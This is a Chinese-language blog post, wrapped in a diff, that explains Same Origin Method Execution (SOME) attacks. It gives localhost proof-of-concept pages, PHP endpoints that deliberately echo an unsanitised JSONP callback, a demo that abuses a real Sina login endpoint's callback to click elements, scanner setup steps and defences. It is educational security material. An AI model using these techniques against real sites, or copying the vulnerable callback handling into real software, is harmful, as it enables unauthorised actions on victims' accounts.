@@ -1,0 +1,639 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>SOME攻击 | MSAREHERE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="MS">
+    
+
+    
+    <meta name="description" content="有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？">
+<meta name="keywords" content="SOME攻击,XSS,JSONP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SOME攻击">
+<meta property="og:url" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/index.html">
+<meta property="og:site_name" content="MSAREHERE">
+<meta property="og:description" content="有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/SOME.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/1.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/2.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/3.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/4.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/5.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/微博.png">
+<meta property="og:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/SOME扫描.png">
+<meta property="og:updated_time" content="2017-12-21T11:18:32.638Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SOME攻击">
+<meta name="twitter:description" content="有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？">
+<meta name="twitter:image" content="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/SOME.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="MSAREHERE" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="MSAREHERE" title="MSAREHERE"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="MSAREHERE">MSAREHERE</a></h1>
+				<h2 class="blog-motto">Just have a little faith</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">主页 | Home</a></li>
+					
+						<li><a href="/archives">归档 | Archives</a></li>
+					
+						<li><a href="/categories">分类 | Categories</a></li>
+					
+						<li><a href="/tags">标签 | Tags</a></li>
+					
+						<li><a href="/about">关于 | About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:michaelwayneliu.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/12/21/SOME攻击/" title="SOME攻击" itemprop="url">SOME攻击</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="MS" target="_blank" itemprop="author">MS</a>
+		
+  <p class="article-time">
+    <time datetime="2017-12-21T13:54:47.000Z" itemprop="datePublished"> 发表于 2017-12-21</time>
+    <span id="busuanzi_container_page_pv">
+    总阅读<span id="busuanzi_value_page_pv"></span>次
+</span>
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text"><a href="#&#x80CC;&#x666F;" class="headerlink" title="&#x80CC;&#x666F;"></a>&#x80CC;&#x666F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOME攻击相关介绍"><span class="toc-number">2.</span> <span class="toc-text"><a href="#SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;" class="headerlink" title="SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;"></a>SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击利用"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x653B;&#x51FB;&#x5229;&#x7528;" class="headerlink" title="&#x653B;&#x51FB;&#x5229;&#x7528;"></a>&#x653B;&#x51FB;&#x5229;&#x7528;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扫描工具使用"><span class="toc-number">4.</span> <span class="toc-text"><a href="#&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;" class="headerlink" title="&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;"></a>&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防护"><span class="toc-number">5.</span> <span class="toc-text"><a href="#&#x5982;&#x4F55;&#x9632;&#x62A4;" class="headerlink" title="&#x5982;&#x4F55;&#x9632;&#x62A4;"></a>&#x5982;&#x4F55;&#x9632;&#x62A4;</span></a></li></ol>
+		
+		</div>
+		
+		<p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？<br><a id="more"></a></p>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？</p>
+<h3 id="SOME攻击相关介绍"><a href="#SOME攻击相关介绍" class="headerlink" title="SOME攻击相关介绍"></a>SOME攻击相关介绍</h3><p>上述是我想出来的可以进行SOME攻击的一种场景。下面来看看这玩意到底是啥。SOME是同源方法执行漏洞（Same Origin Method Execution）的简称，SOME是web应用程序攻击方法中的一种，类似于Hijacking攻击，它通过强制受害者在endpoints的域上执行任意页面的脚本方法来滥用回调endpoints，理论上任何具备点击功能（比如添加删除、授权确认等）的网站都存在遭受这种攻击的可能，缺陷是不能带参数操作。<br>既然叫同源方法执行漏洞，要想利用该漏洞针对的就是同源网站下的页面。同源简单的来说就是通信双方协议、域名、端口都要一致。同源保证了网站间数据交换的相对安全，比如A网站不能随意去拿或者操作B网站的数据。对于功能丰富的网站来说，很多时候需要把其他网站的资源拿过来用用，为了突破同源策略带来的一些限制，出现了JSONP、PostMessage等技术。<br>JSONP(JSON with Padding)是啥呢？个人理解，利用script标签的跨域属性从不是一定是同域的网站拿来数据用本地的JS函数执行。不懂用代码自己试试就理解啦。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务端实现callback函数</span><br><span class="line">&lt;?php</span><br><span class="line">//服务端返回JSON数据</span><br><span class="line">$arr=array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3,&apos;d&apos;=&gt;4,&apos;e&apos;=&gt;5);</span><br><span class="line">$result=json_encode($arr);</span><br><span class="line">//动态执行回调函数</span><br><span class="line">$callback=$_GET[&apos;callback&apos;];</span><br><span class="line">echo $callback.&quot;($result)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">客户端发起callback请求</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonpCallback(result) &#123;</span><br><span class="line">//alert(result);</span><br><span class="line">for(var i in result) &#123;</span><br><span class="line">alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc.</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">var JSONP=document.createElement(&quot;script&quot;);</span><br><span class="line">JSONP.type=&quot;text/javascript&quot;;</span><br><span class="line">JSONP.src=&quot;http://127.0.0.1.com/cb.php?callback=jsonpCallback&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(JSONP);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>正常的callback请求只允许[A-Za-z0-9_.]，也就是说xss要用到的字符比如&lt;、&gt;、&amp;、#之类的都是不在允许的范围内的，所以理论上是无法实施xss攻击的。</p>
+<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>这种攻击也有很多限制</p>
+<pre><code>条件：目标同域下存在JSONP接口，允许.（点号），并且允许用户提交callback的函数名，callback函数能被JavaScript执行
+危害：应用自动授权(OAuth认证)、自动点赞等
+</code></pre><p>如果条件满足，举个例子，我本地www\jsonp\base_example目录下存在main.html，step1.html，function.html，jsonp.php，jsonp_data.php<br>其中main.html内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SOME Main&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">function startSOME() &#123; </span><br><span class="line">	myWindow=window.open(&apos;http://127.0.0.1/jsonp/base_example/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">	// myWindow.document.write(&quot;This is &apos;myWindow&apos;&quot;);</span><br><span class="line">	// myWindow.focus();</span><br><span class="line">	window.location.href = &quot;http://127.0.0.1/jsonp/base_example/function.html&quot;;</span><br><span class="line">&#125; </span><br><span class="line">startSOME();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出来，打开main.html会打开一个小窗口step1.html，并且重定向到function.html<br>,然后过了三秒，弹出了一个框。但是看了看function.html里面的内容，并没有弹窗操作啊？<br><img src="/2017/12/21/SOME攻击/SOME.png" alt="image"><br>所以再来看看step1.html和function.html呢<br>小窗口step1.html的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function waitForDOM() &#123;</span><br><span class="line">	window.location.href =&quot;http://127.0.0.1/jsonp/base_example/jsonp.php?callback=window.opener.shareAllPhotos&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(waitForDOM,3000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>它会等三秒，这里等不等根据实际应用场景决定，不用纠结。然后呢，小窗口step1.html又重定向了，重定向到一个看起来像JSONP接口页面了。<br>页面有啥呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script src=&quot;http://127.0.0.1/jsonp/base_example/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这个页面的功能原来是根据get操作得到的值向一个JSONP接口发起请求，而且callback的JS函数都定好了。<br>快接近真相了，jsonp_data.php的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo $_GET[&quot;callback&quot;] . &quot;(&#123; my_photo : &apos;photo&apos; &#125;);&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以这里返回的结果就是要让jsonp.php执行window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作呗。那么问题来了，window.opener是谁？jsonp.php？不，看看<a href="http://www.w3school.com.cn/jsref/prop_win_opener.asp" target="_blank" rel="noopener">这个</a>，可知opener 属性是一个可读可写的属性，可返回对创建该窗口的 Window 对象的引用。所以window.opener是最开始打开step1.html小窗口的main.html，但是现在它重定向到function.html，window.opener也就是function.html。所以window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作的也就是function.html。<br>这是function.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Google Photos&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt; </span><br><span class="line">    function shareAllPhotos(data) &#123; </span><br><span class="line">        prompt(data.my_photo);</span><br><span class="line">    &#125; </span><br><span class="line">    console.log(window.opener);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这个方法成功的关键因素是，当一个窗口文件被重定向之后，它的窗口对象仍然保存在原始分配的内存空间中，如果窗口A打开了窗口B，用户代理将会创建一个指向窗口A的引用，当窗口A的文件内容被修改（重定向）后，引用并不会被清除，而且窗口B仍然能够使用窗口属性值来引用它。</p>
+<p>你可能会说这个玩意有什么用啊，其实上述例子是谷歌曾经发生过的一个漏洞，攻击者通过上述流程劫持了window.opener.shareAllPhotos函数，利用一个有漏洞的回调函数，把谷歌上的私人相片发到了攻击者指定的域名。<br>具体的执行流程可以看下图<br><img src="/2017/12/21/SOME攻击/1.png" alt="image"><br><img src="/2017/12/21/SOME攻击/2.png" alt="image"><br><img src="/2017/12/21/SOME攻击/3.png" alt="image"><br><img src="/2017/12/21/SOME攻击/4.png" alt="image"><br><img src="/2017/12/21/SOME攻击/5.png" alt="image"><br>再看一个例子呢，假设我找到了一个微博的jsonp利用点，而在我本地某目录下有两个文件test.php和test2.html<br>test.php内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP test&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">myWindow=window.open(&apos;http://127.0.0.1/jsonp/example/test2.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;button onclick=&apos;alert(&quot;成了！！！&quot;)&apos;&gt;成了&lt;/button&gt;</span><br><span class="line">	&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">	&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，我这里只是为了方便大家理解，这个页面没有跳转操作，而SOME攻击的利用必须要一个跳转，跳转到目标域下才能完成利用。这里test.php打开了test2.html，test2.html的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://login.sina.com.cn/sso/logout.php?callback=window.opener.document.body.firstElementChild.click&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>只是作为理解用，这个接口在实际利用中并没有啥用。可以看到，回调中调用了父窗口的部件的点击操作。<br>然后，打开本地url，我的是<a href="http://127.0.0.1/jsonp/example/test.php，就会看到" target="_blank" rel="noopener">http://127.0.0.1/jsonp/example/test.php，就会看到</a><br><img src="/2017/12/21/SOME攻击/微博.png" alt="image"></p>
+<h3 id="扫描工具使用"><a href="#扫描工具使用" class="headerlink" title="扫描工具使用"></a>扫描工具使用</h3><ol>
+<li>装上burp，打开<a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener">这个</a>。</li>
+<li>安装Maven：<br> 1.下载Maven的安装包，下载链接：<a href="http://maven.apache.org/download.cgi；" target="_blank" rel="noopener">http://maven.apache.org/download.cgi；</a><br> 2.下载后的文件为apache-maven-3.2.5-bin.zip 压缩包，将其解压到一个固定的文件夹。我的是解压到 C:\tools 目录下，更新Maven时只需要下载新的Maven包，解压到此目录并按照第三步修改环境变量即可。<br> 3.修改环境变量。打开系统属性面板（在桌面上右击”我的电脑” -&gt;”属性”-&gt;”高级系统设置”），然后点击”环境变量” -&gt;”新建”-&gt;输入”M2_HOME”和Maven解压后的根目录路径（我解压到C:\tools下所以完整的路径就是C:\tools\apache-maven-3.2.5），然后点击确定，再然后找到名为Path的系统变量，单击选中后点击”编辑”，将 %M2_HOME%\bin; 添加到变量值的开头（注意最后的分号也是要添加的）。<br> 4.验证是否安装成功。点击windows左下角的”开始”，在搜索框中输入cmd，然后回车就可以打开windows的命令提示符窗口，然后输入 echo %M2_HOME% 命令查看设置的环境变量，输入mvn -v 查看maven的版本<br>3.按官方git说明安装生成jar文件，mvn compile &amp;&amp; mvn package，从burp加载生成的jar包，即可对网站被动扫描<br><img src="/2017/12/21/SOME攻击/SOME扫描.png" alt="image"></li>
+</ol>
+<h3 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h3><pre><code>使用固定的回调值，而不是外部化回调控制
+白名单方法 -- 设置一个白名单，列出并匹配给定的回调参数值。这将强制执行并验证只有合法的回调函数可以执行。
+跨域消息传递 - 使用postMessage通知事件并与跨域进行交互，作为执行javascript回调的替代方法（如果适用）。
+</code></pre><p>参考链接：</p>
+<pre><code>http://www.benhayak.com/2015/06/same-origin-method-execution-some.html
+http://www.mottoin.com/91299.html
+http://blog.safedog.cn/?p=13
+https://www.someattack.com/Playground/
+https://github.com/linkedin/sometime
+</code></pre>  
+	</div>
+
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/前端安全/">前端安全</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/SOME攻击/">SOME攻击</a><a href="/tags/XSS/">XSS</a><a href="/tags/JSONP/">JSONP</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" data-title="SOME攻击 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2018/01/12/service-worker-xss进化/" title="service worker--xss进化">
+  <strong>上一篇：</strong><br/>
+  <span>
+  service worker--xss进化</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2017/12/21/博客迁移及jacman主题配置/"  title="博客迁移及jacman主题配置">
+ <strong>下一篇：</strong><br/> 
+ <span>博客迁移及jacman主题配置
+</span>
+</a>
+</div>
+
+</nav>
+
+
+<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMjUxMS85MDcy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+
+
+	
+	
+
+<section id="comments" class="comment">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text"><a href="#&#x80CC;&#x666F;" class="headerlink" title="&#x80CC;&#x666F;"></a>&#x80CC;&#x666F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOME攻击相关介绍"><span class="toc-number">2.</span> <span class="toc-text"><a href="#SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;" class="headerlink" title="SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;"></a>SOME&#x653B;&#x51FB;&#x76F8;&#x5173;&#x4ECB;&#x7ECD;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击利用"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x653B;&#x51FB;&#x5229;&#x7528;" class="headerlink" title="&#x653B;&#x51FB;&#x5229;&#x7528;"></a>&#x653B;&#x51FB;&#x5229;&#x7528;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扫描工具使用"><span class="toc-number">4.</span> <span class="toc-text"><a href="#&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;" class="headerlink" title="&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;"></a>&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x4F7F;&#x7528;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防护"><span class="toc-number">5.</span> <span class="toc-text"><a href="#&#x5982;&#x4F55;&#x9632;&#x62A4;" class="headerlink" title="&#x5982;&#x4F55;&#x9632;&#x62A4;"></a>&#x5982;&#x4F55;&#x9632;&#x62A4;</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/前端安全/" title="前端安全">前端安全<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/博客/" title="博客">博客<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/XSS/" title="XSS">XSS<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/JSONP/" title="JSONP">JSONP<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/序列化/" title="序列化">序列化<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/博客迁移/" title="博客迁移">博客迁移<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/jacman主题配置/" title="jacman主题配置">jacman主题配置<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/反弹shell/" title="反弹shell">反弹shell<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SOME攻击/" title="SOME攻击">SOME攻击<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Service-Worker/" title="Service Worker">Service Worker<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://blackwolfsec.cc" target="_blank" title="blackwolf">blackwolf</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=2639885925&verifier=b3593ceb&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
